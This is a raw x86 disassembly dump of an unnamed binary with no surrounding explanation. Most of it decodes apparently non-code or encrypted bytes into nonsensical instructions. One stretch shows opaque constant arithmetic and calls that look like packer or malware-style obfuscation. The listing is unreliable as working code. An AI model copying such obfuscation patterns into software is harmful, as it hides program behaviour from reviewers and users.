  40f844:	addr16 ret 
  40f846:	mov    ebx,0x38f57bc2
  40f84b:	je     0x40f7f3
  40f84d:	ret    0xd08a
  40f850:	xor    DWORD PTR [ecx+0x7b],esi
  40f853:	and    bl,cl
  40f855:	inc    ebp
  40f856:	aas    
  40f857:	idiv   BYTE PTR [ecx]
  40f859:	int    0xa2
  40f85b:	imul   esp,DWORD PTR [ebp+0x18528a8d],0xbdddeb99
  40f865:	sub    al,BYTE PTR [eax]
  40f867:	rol    DWORD PTR [edi+0x7a535274],cl
  40f86d:	adc    eax,0xa10c265
  40f872:	cs sub ebx,ecx
  40f875:	mov    esi,DWORD PTR [esi+eiz*2-0x34]
  40f879:	jge    0x40f896
  40f87b:	mov    al,ds:0x22a77e64
  40f880:	mov    ch,0xcc
  40f882:	xchg   edx,eax
  40f883:	aaa    
  40f884:	test   eax,0x3b1149db
  40f889:	mov    DWORD PTR [edx+ebp*8-0x60],eax
  40f88d:	xchg   BYTE PTR [edi+0x6b6d0d7c],al
  40f893:	fs add eax,0xeabc9d62
  40f899:	mov    edx,0x9ce04b1a
  40f89e:	imul   esp,esp,0xffffffbf
  40f8a1:	cli    
  40f8a2:	cmp    DWORD PTR [ebx],eax
  40f8a4:	nop
  40f8a5:	push   es
  40f8a6:	lods   eax,DWORD PTR ds:[esi]
  40f8a7:	shl    bh,1
  40f8a9:	jb     0x40f8aa
  40f8ab:	cs call 0xc7e4:0x257f2391
  40f8b3:	call   0xfb22:0x56037188
  40f8ba:	cmp    cl,ch
  40f8bc:	test   DWORD PTR [ecx-0x32257bd5],edi
  40f8c2:	inc    esi
  40f8c3:	test   al,0x3c
  40f8c5:	ins    BYTE PTR es:[edi],dx
  40f8c6:	jbe    0x40f946
  40f8c8:	pop    esp
  40f8c9:	or     dh,BYTE PTR [edx+0x78]
  40f8cc:	ret    0xd204
  40f8cf:	loope  0x40f886
  40f8d1:	test   eax,0x8da5fc36
  40f8d6:	mov    ds:0xcb952d8c,al
  40f8db:	jnp    0x40f90a
  40f8dd:	clc    
  40f8de:	push   esi
  40f8df:	shl    DWORD PTR [eax-0x41de13d9],0xbd
  40f8e6:	sub    cl,BYTE PTR [edx-0x30c1673d]
  40f8ec:	pop    eax
  40f8ed:	cmp    DWORD PTR [edi-0x51],0x2a
  40f8f1:	xlat   BYTE PTR ds:[ebx]
  40f8f2:	mov    bh,0x25
  40f8f4:	add    ch,bl
  40f8f6:	inc    esi
  40f8f7:	mov    dl,0xef
  40f8f9:	leave  
  40f8fa:	dec    ebp
  40f8fb:	retf   
  40f8fc:	in     eax,dx
  40f8fd:	daa    
  40f8fe:	imul   BYTE PTR [ebp+0x58]
  40f901:	jecxz  0x40f91b
  40f903:	rcr    DWORD PTR [eax-0x26a10be2],0xdf
  40f90a:	adc    al,0xd8
  40f90c:	inc    ecx
  40f90d:	jg     0x40f8e4
  40f90f:	(bad)  
  40f910:	fwait
  40f911:	sahf   
  40f912:	out    0xb5,al
  40f914:	loope  0x40f985
  40f916:	enter  0xeaaa,0x13
  40f91a:	pop    eax
  40f91b:	loope  0x40f984
  40f91d:	xchg   ebp,eax
  40f91e:	mov    al,0xad
  40f920:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f921:	pop    ebp
  40f922:	lock push 0xffffffb0
  40f925:	lea    ecx,[ebx+edx*1+0x42]
  40f929:	loop   0x40f8b4
  40f92b:	test   ebp,0x1b009b3b
  40f931:	data16 xchg BYTE PTR [ecx+edx*8+0x27],dl
  40f936:	repnz retf 0xb625
  40f93a:	push   cs
  40f93b:	xchg   ecx,eax
  40f93c:	mov    eax,0x321cbf85
  40f941:	in     eax,0x45
  40f943:	xchg   esi,eax
  40f944:	jno    0x40f93c
  40f946:	xor    BYTE PTR [edi+0xc101b6a],cl
  40f94c:	cdq    
  40f94d:	mov    ds:0x414f3eb7,eax
  40f952:	or     eax,0x37e50d83
  40f957:	lods   eax,DWORD PTR ds:[esi]
  40f958:	push   0x3d8cddd4
  40f95d:	jp     0x40f9dd
  40f95f:	sbb    BYTE PTR [edx+0x3f],dl
  40f962:	sbb    al,0xf7
  40f964:	pop    edi
  40f965:	call   0xf14c:0xa2b1bf52
  40f96c:	mov    eax,0xdc281770
  40f971:	sbb    DWORD PTR [eax],ecx
  40f973:	cmp    eax,0x983bf695
  40f978:	inc    ebx
  40f979:	out    dx,al
  40f97a:	out    0x23,al
  40f97c:	cli    
  40f97d:	or     al,0xb7
  40f97f:	jecxz  0x40f96b
  40f981:	push   esp
  40f982:	jo     0x40f9e6
  40f984:	adc    eax,0x363d7436
  40f989:	dec    esp
  40f98a:	push   0xffffffd0
  40f98c:	mov    ecx,0xa3916240
  40f991:	jecxz  0x40f977
  40f993:	cmp    ah,dl
  40f995:	jmp    0xba481f43
  40f99a:	sub    DWORD PTR [edi],ebp
  40f99c:	ins    BYTE PTR es:[edi],dx
  40f99d:	int3   
  40f99e:	sub    dh,BYTE PTR [ecx-0x47]
  40f9a1:	(bad)  
  40f9a3:	xchg   BYTE PTR ds:0x24dda205,al
  40f9a9:	dec    ebx
  40f9aa:	int    0xbc
  40f9ac:	in     al,0xde
  40f9ae:	mov    dh,0x5f
  40f9b0:	jecxz  0x40f9ee
  40f9b2:	rcl    DWORD PTR [ebp-0xc],cl
  40f9b5:	or     al,BYTE PTR [edx]
  40f9b7:	xor    BYTE PTR [esi],ah
  40f9b9:	arpl   si,sp
  40f9bb:	push   edx
  40f9bc:	jge    0x40fa3d
  40f9be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9bf:	inc    esp
  40f9c0:	jns    0x40fa32
  40f9c2:	push   ecx
  40f9c3:	enter  0x703d,0x8
  40f9c7:	retf   
  40f9c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9c9:	das    
  40f9ca:	mov    ah,0xd
  40f9cc:	or     DWORD PTR [esi+edi*8-0x13cc1086],esp
  40f9d3:	jbe    0x40f984
  40f9d5:	or     ch,ah
  40f9d7:	call   0xe385:0x330abce3
  40f9de:	pop    esp
  40f9df:	push   ebx
  40f9e0:	jmp    0x36022532
  40f9e5:	ds or  al,0x0
  40f9e8:	add    BYTE PTR [ecx+0x45c7a845],cl
  40f9ee:	in     al,dx
  40f9ef:	mov    ebp,0x59000066
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x4220ab
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp-0x4acfb190]
  40fc87:	jl     0x40fcff
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xa7181814
  40fc91:	jg     0x40fd11
  40fc93:	loopne 0x40fcf4
  40fc95:	pop    ebp
  40fc96:	or     ch,BYTE PTR [esp+ebp*2+0x59be408a]
  40fc9d:	(bad)  
  40fc9e:	mov    ds:0x6acb4cf3,al
  40fca3:	cdq    
  40fca4:	jns    0x40fca5
  40fca6:	fld    st(4)
  40fca8:	add    al,0x13
  40fcaa:	test   al,0x8d
  40fcac:	pop    ebx
  40fcad:	jne    0x40fc4c
  40fcaf:	push   edx
  40fcb0:	mov    edi,0x1b6e628
  40fcb5:	and    esi,ebx
  40fcb7:	or     BYTE PTR [ecx+0x79],bl
  40fcba:	add    al,0x51
  40fcbc:	dec    di
  40fcbe:	ds mov dl,0x88
  40fcc1:	lods   eax,DWORD PTR ds:[esi]
  40fcc2:	enter  0x31c2,0x7
  40fcc6:	aad    0x84
  40fcc8:	in     eax,0xe1
  40fcca:	cdq    
  40fccb:	call   0xd971:0x53378e8
  40fcd2:	mov    eax,ds:0xfb82f131
  40fcd7:	add    eax,0x2fe272c3
  40fcdc:	ds iret 
  40fcde:	adc    ebp,0x8207063b
  40fce4:	inc    edi
  40fce5:	lds    esi,FWORD PTR ds:0xb35fe305
  40fceb:	icebp  
  40fcec:	mov    ecx,0x6757ae30
  40fcf1:	stc    
  40fcf2:	bound  edx,QWORD PTR [eax]
  40fcf4:	xchg   ebp,eax
  40fcf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fcf6:	stos   DWORD PTR es:[edi],eax
  40fcf7:	xlat   BYTE PTR ds:[ebx]
  40fcf8:	dec    edx
  40fcf9:	push   ebx
  40fcfa:	gs sbb edx,esi
  40fcfd:	dec    ebp
  40fcfe:	repz xor esp,edi
  40fd01:	and    edi,DWORD PTR [ecx-0x14]
  40fd04:	int    0x90
  40fd06:	mov    ecx,0x2b26ae08
  40fd0b:	fidiv  WORD PTR [ecx]
  40fd0d:	enter  0x69e2,0x6f
  40fd11:	mov    esi,0xf55ba63
  40fd16:	loope  0x40fd6e
  40fd18:	and    ch,BYTE PTR ds:0xb74dd51e
  40fd1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd1f:	xchg   esp,eax
  40fd20:	sbb    dl,al
  40fd22:	rcl    dh,cl
  40fd24:	push   esi
  40fd25:	push   0x6b
  40fd27:	jge    0x40fd0e
  40fd29:	ret    
  40fd2a:	add    eax,0x8d94f12c
  40fd2f:	dec    ecx
  40fd30:	cmp    ebp,DWORD PTR [esi+edx*8]
  40fd33:	sbb    DWORD PTR [ecx+0x29],esp
  40fd36:	or     al,BYTE PTR [ecx+0x1e]
  40fd39:	cmp    al,0x1
  40fd3b:	cmp    DWORD PTR [ebx],ecx
  40fd3d:	pop    esi
  40fd3e:	lea    eax,[edx-0x76]
  40fd41:	jge    0x40fd0f
  40fd43:	mov    dl,0x9
  40fd45:	xchg   edx,eax
  40fd46:	inc    esp
  40fd47:	jmp    0x40fd4f
  40fd49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd4a:	(bad)  
  40fd4b:	pushw  0x4238
  40fd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd50:	push   0xc8144813
  40fd55:	jns    0x40fd4c
  40fd57:	mov    eax,ds:0x19cd457f
  40fd5c:	in     al,0x66
  40fd5e:	ja     0x40fcea
  40fd60:	push   ebp
  40fd61:	push   edi
  40fd62:	arpl   bx,di
  40fd64:	sar    BYTE PTR [edi+0x3325685a],1
  40fd6a:	push   es
  40fd6b:	cmp    ch,dh
  40fd6d:	and    eax,0xa28e8a7c
  40fd72:	pop    edi
  40fd73:	iret   
  40fd74:	inc    edi
  40fd75:	add    eax,0xd7519b1
  40fd7a:	addr16 push edi
  40fd7c:	(bad)  
  40fd7d:	pop    edi
  40fd7e:	lods   eax,DWORD PTR ds:[esi]
  40fd7f:	test   BYTE PTR [edx],dl
  40fd81:	sar    BYTE PTR [ebx+0x9],1
  40fd84:	adc    ebx,DWORD PTR [eax-0x4d]
  40fd87:	xlat   BYTE PTR ds:[ebx]
  40fd88:	jge    0x40fdad
  40fd8a:	cdq    
  40fd8b:	jp     0x40fd49
  40fd8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd8e:	lods   al,BYTE PTR ds:[esi]
  40fd8f:	fiadd  WORD PTR [esi-0x60]
  40fd92:	and    dh,BYTE PTR [edx+eax*4+0x1c]
  40fd96:	outs   dx,BYTE PTR ds:[esi]
  40fd97:	mov    ch,0xf6
  40fd99:	fcomi  st,st(0)
  40fd9b:	mov    ebx,0x88a8986a
  40fda0:	xchg   DWORD PTR [edx-0x5b],eax
  40fda3:	push   eax
  40fda4:	gs and al,0xea
  40fda7:	lods   eax,DWORD PTR ds:[esi]
  40fda8:	fcmovu st,st(3)
  40fdaa:	jmp    0xa577:0xb09956ed
  40fdb1:	push   edx
  40fdb2:	or     DWORD PTR [ecx],0x7
  40fdb5:	jno    0x40fe2c
  40fdb7:	in     al,dx
  40fdb8:	int    0x17
  40fdba:	inc    ebp
  40fdbb:	and    cl,BYTE PTR [ebx]
  40fdbd:	push   eax
  40fdbe:	mov    edi,0x5d7ffac2
  40fdc3:	and    DWORD PTR [edi+0x76eaf84a],esi
  40fdc9:	cmc    
  40fdca:	inc    edx
  40fdcb:	dec    ebx
  40fdcc:	outs   dx,DWORD PTR ds:[esi]
  40fdcd:	xchg   ecx,eax
  40fdce:	clc    
  40fdcf:	je     0x40fda2
  40fdd1:	idiv   bh
  40fdd3:	out    0xca,al
  40fdd5:	jns    0x40fe10
  40fdd7:	push   ebx
  40fdd8:	cmp    BYTE PTR [edi+eiz*4-0x6e],al
  40fddc:	in     eax,0x44
  40fdde:	(bad)  
  40fde0:	icebp  
  40fde1:	fcmovnu st,st(2)
  40fde3:	xor    eax,0xdc6916d1
  40fde8:	sub    eax,0x97ffbcca
  40fded:	inc    edx
  40fdee:	adc    cl,BYTE PTR [edx-0xf]
  40fdf1:	daa    
  40fdf2:	adc    ah,BYTE PTR [esi]
  40fdf4:	aad    0xda
  40fdf6:	test   al,0xa4
  40fdf8:	push   0x5a51d7f2
  40fdfd:	push   edx
  40fdfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdff:	lods   al,BYTE PTR ds:[esi]
  40fe00:	push   ecx
  40fe01:	pop    es
  40fe02:	dec    ecx
  40fe03:	push   ss
  40fe04:	stc    
  40fe05:	xchg   ebp,eax
  40fe06:	jno    0x40fe4e
  40fe08:	scas   eax,DWORD PTR es:[edi]
  40fe09:	(bad)  
  40fe0b:	out    dx,eax
  40fe0c:	jnp    0x40fded
  40fe0e:	mov    eax,ds:0x5c41f699
  40fe13:	scas   al,BYTE PTR es:[edi]
  40fe14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe15:	xchg   edx,eax
  40fe16:	sbb    eax,eax
  40fe18:	iret   
  40fe19:	in     al,dx
  40fe1a:	mov    eax,ds:0x7e94b797
  40fe1f:	je     0x40fde0
  40fe21:	ja     0x40fe33
  40fe23:	dec    esi
  40fe24:	ins    DWORD PTR es:[edi],dx
  40fe25:	and    BYTE PTR ds:0xf4d37953,bl
  40fe2b:	or     al,0xc
  40fe2d:	(bad)  
  40fe2e:	adc    ebp,DWORD PTR [eax+0x3]
  40fe31:	in     al,0xb4
  40fe33:	mov    DWORD PTR [esp+ecx*4+0x5cba9326],esp
  40fe3a:	cmp    BYTE PTR [ebp+0x5b],dl
  40fe3d:	repz cmp al,BYTE PTR [eax]
  40fe40:	fstp   st(3)
  40fe42:	mov    dh,0xd2
  40fe44:	scas   eax,DWORD PTR es:[edi]
  40fe45:	sub    DWORD PTR [edx+0x1a],esp
  40fe48:	dec    ecx
  40fe49:	add    al,0x7d
  40fe4b:	fwait
  40fe4c:	inc    esi
  40fe4d:	or     BYTE PTR [eax-0x24],ah
  40fe50:	sbb    eax,0x87dc79b7
  40fe55:	xor    DWORD PTR [esi+0x75],edx
  40fe58:	rcr    DWORD PTR [esi],0x30
  40fe5b:	jne    0x40feae
  40fe5d:	xor    edx,esi
  40fe5f:	leave  
  40fe60:	inc    ecx
  40fe61:	(bad)  
  40fe62:	xlat   BYTE PTR ds:[ebx]
  40fe63:	cdq    
  40fe64:	in     eax,0xbd
  40fe66:	push   ds
  40fe67:	sbb    bh,BYTE PTR [esi+0x22]
  40fe6a:	addr16 aaa 
  40fe6c:	and    al,0x65
  40fe6e:	dec    esp
  40fe6f:	adc    esi,esi
  40fe71:	in     al,dx
  40fe72:	in     al,0xc5
  40fe74:	daa    
  40fe75:	add    DWORD PTR [eax+edi*4+0x1f1223e9],edi
  40fe7c:	xchg   ebp,eax
  40fe7d:	pop    ebp
  40fe7e:	jle    0x40fe28
  40fe80:	pop    esp
  40fe81:	enter  0xe088,0x55
  40fe85:	or     BYTE PTR [ecx-0x3afeae4a],ah
  40fe8b:	pop    edi
  40fe8c:	mov    gs,WORD PTR [esi-0x4d]
  40fe8f:	push   ds
  40fe90:	inc    ebp
  40fe91:	fstp   QWORD PTR ds:0xcfc8e651
  40fe98:	push   edi
  40fe99:	test   eax,0xf2c39b3
  40fe9e:	mov    WORD PTR [esi],fs
  40fea0:	fadd   QWORD PTR [edx]
  40fea2:	xor    DWORD PTR ds:0x9c60b542,0xffffff84
  40fea9:	pop    ds
  40feaa:	mov    ah,0x91
  40feac:	stos   DWORD PTR es:[edi],eax
  40fead:	inc    ebx
  40feae:	fcomip st,st(2)
  40feb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feb1:	lea    ebx,[ebx-0x7c]
  40feb4:	std    
  40feb5:	imul   esi,DWORD PTR [ebp-0x69771b1b],0x53
  40febc:	sti    
  40febd:	xchg   ebx,eax
  40febe:	push   ebp
  40febf:	fisubr WORD PTR [edi+0x8055184]
  40fec5:	pushf  
  40fec6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fec7:	add    eax,0x3c42ca39
  40fecc:	mov    dl,BYTE PTR [eax-0x21]
  40fecf:	sub    al,0xe6
  40fed1:	xchg   dl,dl
  40fed3:	push   ds
  40fed4:	push   ebp
  40fed5:	loop   0x40ff01
  40fed7:	sahf   
  40fed8:	push   esi
  40fed9:	inc    esp
  40feda:	enter  0xf1a8,0x28
  40fede:	arpl   WORD PTR [ebx+0x61],ax
  40fee1:	aaa    
  40fee2:	test   BYTE PTR [eax-0xd283197],bh
  40fee8:	scas   al,BYTE PTR es:[edi]
  40fee9:	add    DWORD PTR [esi],0x39f04020
  40feef:	xor    al,BYTE PTR [ecx]
  40fef1:	jp     0x40febc
  40fef3:	dec    esp
  40fef4:	ja     0x40feec
  40fef6:	mov    eax,ds:0x94970296
  40fefb:	popf   
  40fefc:	sub    DWORD PTR [esp+edi*4],esp
  40feff:	mov    esi,0xec6378c1
  40ff04:	sbb    ch,BYTE PTR [edi+0x4b1d1bfe]
  40ff0a:	lock sbb bh,BYTE PTR [ebp-0x2ee1bf45]
  40ff11:	nop
  40ff12:	lods   al,BYTE PTR ds:[esi]
  40ff13:	sub    al,0x38
  40ff15:	pop    ecx
  40ff16:	jne    0x40fee0
  40ff18:	inc    ecx
  40ff19:	test   eax,0x1d38a107
  40ff1e:	test   eax,0x4477a9d4
  40ff23:	ror    BYTE PTR [esi+0x2fce8c37],1
  40ff29:	dec    ecx
  40ff2a:	cmp    eax,0xa703ea5a
  40ff2f:	mov    al,ds:0xf163a74a
  40ff34:	clc    
  40ff35:	shl    BYTE PTR [eax],1
  40ff37:	mov    ah,0xdb
  40ff39:	in     eax,dx
  40ff3a:	call   0xbfd8634d
  40ff3f:	ror    DWORD PTR [ebx+0x5],0x1
  40ff43:	cmp    DWORD PTR [eax],eax
  40ff45:	add    BYTE PTR ds:0x40c2,dh
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1-0x22838c47]
  40ff68:	adc    ch,BYTE PTR [ecx+0x18981dbc]
  40ff6e:	sbb    BYTE PTR [esi+0x70181814],bh
  40ff74:	cmc    
  40ff75:	dec    esp
  40ff76:	loope  0x40ffa8
  40ff78:	or     DWORD PTR cs:[edx+esi*1-0x13],ecx
  40ff7d:	fbld   TBYTE PTR [ebp-0x2d67462d]
  40ff83:	and    BYTE PTR [edi-0x3c23e8e4],0x6c
  40ff8a:	inc    ebx
  40ff8b:	mov    BYTE PTR [esi-0x1a25d65c],ah
  40ff91:	test   al,0x3c
  40ff93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff94:	push   es
  40ff95:	rcl    BYTE PTR [edx-0x7c],cl
  40ff98:	mov    eax,0x95dae8ae
  40ff9d:	sbb    bh,BYTE PTR [esi+0x19]
  40ffa0:	loopne 0x40ff4d
  40ffa2:	psllw  mm0,QWORD PTR [ebx+0x6f92da64]
  40ffa9:	pop    eax
  40ffaa:	ret    0x4184
  40ffad:	push   ds
  40ffae:	jmp    0x2bc10c3d
  40ffb3:	mov    ebx,0x4ad04625
  40ffb8:	clc    
  40ffb9:	add    DWORD PTR [ecx],ebx
  40ffbb:	loopne 0x40ff7f
  40ffbd:	jo     0x40ffba
  40ffbf:	fmul   DWORD PTR [edi+0x27]
  40ffc2:	ficom  DWORD PTR [edi+0x1b]
  40ffc5:	hlt    
  40ffc6:	addr16 inc eax
  40ffc8:	retf   
  40ffc9:	dec    esi
  40ffca:	jmp    0x7662:0xc69237c
  40ffd1:	(bad)  
  40ffd2:	pop    edi
  40ffd3:	xor    BYTE PTR [eax+esi*2+0xf],cl
  40ffd7:	sbb    BYTE PTR [ebp+0x6c],ch
  40ffda:	jecxz  0x410051
  40ffdc:	(bad)  
  40ffdd:	fwait
  40ffde:	xor    al,ch
  40ffe0:	add    esp,DWORD PTR [ebx+0x56]
  40ffe3:	sub    DWORD PTR [eax],esp
  40ffe5:	sub    ebp,DWORD PTR [esi-0x53328ede]
  40ffeb:	xor    al,0x70
  40ffed:	je     0x41006b
  40ffef:	shl    cl,cl
  40fff1:	dec    DWORD PTR [edi+0x29]
  40fff4:	mov    al,BYTE PTR [edi+0x65]
  40fff7:	iret   
  40fff8:	int    0x96
  40fffa:	in     eax,dx
  40fffb:	and    edx,DWORD PTR [ebp+ebx*8-0x49]
  40ffff:	push   ebx
  410000:	cmp    ecx,ecx
  410002:	jae    0x40ffee
  410004:	xor    ebp,esp
  410006:	gs (bad) 
  410008:	fisub  WORD PTR [ebp+ecx*4+0x1e52c3eb]
  41000f:	sbb    al,0x61
  410011:	sbb    bl,al
  410013:	ins    BYTE PTR es:[edi],dx
  410014:	adc    DWORD PTR [edx-0x46],0xc8745213
  41001b:	xor    eax,0x1bc35ccb
  410020:	shl    DWORD PTR [esi+0x723cf164],1
  410026:	loopne 0x4100a5
  410028:	jnp    0x4100a7
  41002a:	or     al,0x38
  41002c:	inc    esp
  41002d:	or     eax,DWORD PTR [ecx]
  41002f:	les    esp,FWORD PTR [edi+eax*2]
  410032:	lock xchg ecx,eax
  410034:	cmp    al,ah
  410036:	fs sub eax,0xb5897087
  41003c:	push   ds
  41003d:	and    al,0x42
  41003f:	cmp    DWORD PTR [ebp+0x684de145],0xa79d6677
  410049:	leave  
  41004a:	popa   
  41004b:	xchg   ecx,eax
  41004d:	and    BYTE PTR [ebx],bh
